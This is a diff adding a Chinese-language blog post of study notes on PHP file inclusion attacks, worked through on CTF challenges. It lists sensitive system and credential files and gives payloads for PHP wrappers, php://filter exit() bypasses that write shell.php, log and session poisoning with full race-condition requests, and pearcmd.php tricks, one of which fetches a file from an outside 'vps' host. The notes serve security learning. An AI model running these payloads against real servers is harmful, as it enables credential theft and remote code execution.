@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            文件包含漏洞
+        </div>
+        <div class="post-meta">
+            2025-03-18
+        </div>
+        <div class="post-md">
+            <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><span id="more"></span>
+
+<p>[TOC]</p>
+<h2 id="敏感文件总结"><a href="#敏感文件总结" class="headerlink" title="敏感文件总结"></a>敏感文件总结</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line"><span class="keyword">/proc/</span>self/cmdline <span class="comment">//当前进程</span></span><br><span class="line"><span class="keyword">/proc/</span>self/environ <span class="comment">//环境变量</span></span><br><span class="line"><span class="keyword">/etc/</span>passwd <span class="comment">// 账户信息</span></span><br><span class="line"><span class="keyword">/etc/</span>shadow <span class="comment">// 账户密码文件</span></span><br><span class="line"><span class="keyword">/etc/</span>my.conf <span class="comment">//mysql 配置文件</span></span><br><span class="line"><span class="keyword">/etc/</span>httpd<span class="keyword">/conf/</span>httpd.conf <span class="comment">// Apache配置文件</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>httpd.conf <span class="comment">//Apache2默认配置文件</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>extra/httpd-vhost.conf <span class="comment">//虚拟网站配置</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>php5<span class="keyword">/lib/</span>php.ini <span class="comment">//PHP相关配置</span></span><br><span class="line"></span><br><span class="line">Windows：</span><br><span class="line"><span class="symbol">C:</span>\boot.ini <span class="comment">//查看系统版本</span></span><br><span class="line"><span class="symbol">C:</span>\Windows\System32\inetsrv\MetaBase.xml <span class="comment">//IIS配置文件</span></span><br><span class="line"><span class="symbol">C:</span>\Windows\repair\sam <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line"><span class="symbol">C:</span>\Program Files\mysql\my.ini <span class="comment">//Mysql配置</span></span><br><span class="line"><span class="symbol">C:</span>\Program Files\mysql\data\mysql\user.MYD <span class="comment">//Mysql root密码</span></span><br><span class="line"><span class="symbol">C:</span>\Windows\php.ini <span class="comment">//php配置信息</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="php相关漏洞"><a href="#php相关漏洞" class="headerlink" title="php相关漏洞"></a>php相关漏洞</h2><h3 id="Wrapper机制"><a href="#Wrapper机制" class="headerlink" title="Wrapper机制"></a>Wrapper机制</h3><p> PHP 提供的文件打开方式不仅仅是简单的文件路径，而是通过文件流的方式进行操作。这些文件流可以被看作是一种特殊的协议，即 Wrapper 协议（PHP中有很多功能不同但形式相似的协议，统称为Wrapper）。</p>
+<p>依赖：<br>allow_url_fopen:On;<br>allow_url_include:On;<br>PHP_Version&gt;&#x3D;5.2.0</p>
+<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>include函数默认使用file协议，且前置了绝对路径,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;filename&quot;</span>) &lt;=&gt; <span class="keyword">include</span>(<span class="string">&quot;file://&quot;</span> . <span class="keyword">__DIR__</span> . <span class="string">&quot;/filename&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p>若文本符合php语法，则会被执行。</p>
+<h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p><code>?file=http://127.0.0.1/flag.php</code></p>
+<h4 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h4><p><code>php://filter</code>：数据过滤与转换</p>
+<p><strong>基本格式：</strong> <code>php://filter/read=convert.base64-encode/resource=[文件路径]</code></p>
+<p>部分其他过滤器：</p>
+<p>convert.base64-decode base64解密<br>string.rot13 rot13变换<br>string.toupper 转大写字母<br>string.tolower 转小写字母<br>string.strip_tags 去除html、PHP语言标签 (本特性已自 PHP 7.3.0 起废弃)</p>
+<blockquote>
+<p><strong>若过滤器均被WAF，可尝试URL二次编码绕过。</strong></p>
+</blockquote>
+<p><code>php://input</code>：执行 PHP 代码</p>
+<p>php:&#x2F;&#x2F;input的请求的参数格式是原生(Raw)的内容，不然无响应。</p>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250802214747037.png" alt="image-20250802214747037"></p>
+<h3 id="文件系统函数-file-get-contents"><a href="#文件系统函数-file-get-contents" class="headerlink" title="文件系统函数 file_get_contents()"></a>文件系统函数 file_get_contents()</h3><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p>应用：绕过死亡exit()</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiaolong22333.top/archives/114/">php死亡exit()绕过 - xiaolong’s blog</a></p>
+<p>虽然大佬们都写得很好了，但我还是跟其他大佬学习，再自己敲一遍加深印象。</p>
+<h4 id="第一种情况："><a href="#第一种情况：" class="headerlink" title="第一种情况："></a>第一种情况：</h4><p><code>file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filename</span>=php://filter/convert.base64-decode/resource=shell.php</span><br><span class="line"><span class="attr">content</span>=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong></p>
+<p>​	要讲清楚这个得先了解<strong>base64-decode的过程</strong>，base64在解密的时候只会识别a-z0-9A-Z+&#x2F; 这64个可打印字符，其余的会忽略。比如例子中<code>&lt;?php exit();</code>其实就只有<code>phpexit</code>七个字符起作用，但base64解码是4个字符为一组，所以我们可以在后面添一个<code>a</code>使得exit最后能被正常解码从而绕过。</p>
+<p>​	于是content&#x3D;<code>a</code> + <code>PD9waHAgcGhwaW5mbygpOz8+</code> ,前者用于补足，后半部分是要执行的代码正常编码。最终写入效果如下（图截取的xiaolong师傅博客中的）：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250803223113323.png" alt="image-20250803223113323"></p>
+<h4 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h4><p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><strong>rot13</strong></p>
+<p><code>content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</code></p>
+<p><strong>base64</strong></p>
+<p><code>content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php</code></p>
+<blockquote>
+<p><strong>若rot等关键词被过滤，可进行URL二次编码绕过.</strong></p>
+</blockquote>
+<h3 id="LFI日志文件包含"><a href="#LFI日志文件包含" class="headerlink" title="LFI日志文件包含"></a>LFI日志文件包含</h3><p>通过UA注入</p>
+<h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
+<h4 id="LFI-Session文件"><a href="#LFI-Session文件" class="headerlink" title="LFI_Session文件"></a>LFI_Session文件</h4><p><strong>默认路径</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_PHPSESSID </span><br><span class="line">/tmp/sess_PHPSESSID </span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<p>PHPSESSID的部分可以在发送的请求包的Cookie中查看。</p>
+<h5 id="会话处理"><a href="#会话处理" class="headerlink" title="会话处理"></a>会话处理</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">两种方式：</span><br><span class="line"><span class="keyword">session</span>.serialize_handler = php           一直都在(默认方式)  它是用 |分割  半序列化存储</span><br><span class="line"></span><br><span class="line"><span class="keyword">session</span>.serialize_handler = php_serialize  php5<span class="number">.5</span>之后启用 它是用serialize反序列化格式分割 完全序列化存储</span><br></pre></td></tr></table></figure>
+
+<p>需要条件竞争，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ed5a888e-8a6b-4e9f-9f47-0d3922ca327d.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再开一个爆破用于访问注入页面。</p>
+<p><strong>例题（helloCTF文件包含靶场level15）：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-a5bd69c2-4da1-4f76-96dc-95354504650f.challenge.ctfplus.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>320</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVuNlu7ztwIR9UWYt</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=flag</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVuNlu7ztwIR9UWYt</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVuNlu7ztwIR9UWYt</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVuNlu7ztwIR9UWYt--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=/var/lib/sessions/sess_flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-a5bd69c2-4da1-4f76-96dc-95354504650f.challenge.ctfplus.cn</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=719a6826f094c0684b1be8daead9cbb0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用这两个请求包条件竞争，从而读取到flag:</p>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250803151037994.png" alt="image-20250803151037994"></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177">LFI 绕过 Session 包含限制 Getshell-安全KER - 安全资讯平台</a></p>
+<h3 id="require-include-once-绕过"><a href="#require-include-once-绕过" class="headerlink" title="require&#x2F;include_once 绕过"></a>require&#x2F;include_once 绕过</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="pearcmd-php的妙用"><a href="#pearcmd-php的妙用" class="headerlink" title="pearcmd.php的妙用"></a>pearcmd.php的妙用</h3><p>前提：register_argc_argv &#x3D; On</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">出网：</span><br><span class="line">http:<span class="regexp">//</span><span class="number">80</span>-<span class="number">75358</span>d89-<span class="number">4</span>e87-<span class="number">4</span>ab7-a7a7-<span class="number">28</span>f0b1348f7f.challenge.ctfplus.cn<span class="regexp">//</span>levelllll2.php?syc=<span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>php<span class="regexp">/pearcmd.php&amp;+install+--installroot=/</span>var<span class="regexp">/www/</span>html+http:<span class="regexp">//</span>vps/info.php</span><br><span class="line"></span><br><span class="line">--installroot=<span class="regexp">/var/</span>www<span class="regexp">/html 可以写成 -R /</span>var<span class="regexp">/www/</span>html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面是出网时的payload，不出网时：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="regexp">/index.php?+config-create+/</span>&amp;file=<span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>php<span class="regexp">/pearcmd.php&amp;/</span>&lt;?=phpinfo()?&gt;+<span class="regexp">/tmp/</span>hello.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考p神的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/%5Blab.magiconch.com%5D%5B90s-time-machine%5D-1740204622856.jpg" alt="w1740204622856"></p>
+<p>（无聊插入的图片）</p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
